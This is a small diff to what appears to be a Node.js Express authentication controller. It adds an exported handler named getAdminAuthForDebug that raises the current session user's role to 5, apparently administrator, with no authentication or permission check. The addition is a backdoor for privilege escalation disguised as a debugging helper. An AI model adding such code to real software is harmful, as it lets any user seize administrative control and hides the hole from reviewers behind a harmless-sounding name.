@@ -108,3 +108,8 @@ exports.logout = function (req, res) {
     });
     res.redirect('/');
 }
+
+exports.getAdminAuthForDebug = function(req, res) {
+    req.session.user.role = 5;
+    res.redirect('/');
+}
